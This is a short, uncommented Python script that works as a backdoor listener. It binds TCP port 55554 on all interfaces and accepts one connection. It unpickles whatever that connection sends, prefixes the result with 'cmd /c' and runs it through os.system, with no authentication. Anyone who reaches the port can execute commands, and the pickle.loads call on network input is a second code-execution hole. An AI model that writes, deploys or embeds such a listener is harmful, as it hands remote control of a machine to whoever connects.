import socket
import os
import pickle
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('', 55554))
s.listen(1)
conn, addr = s.accept()
command = conn.recv(100)
final_command = "cmd /c"
final_command += " ".join(pickle.loads(command))
os.system(final_command)
conn.close()
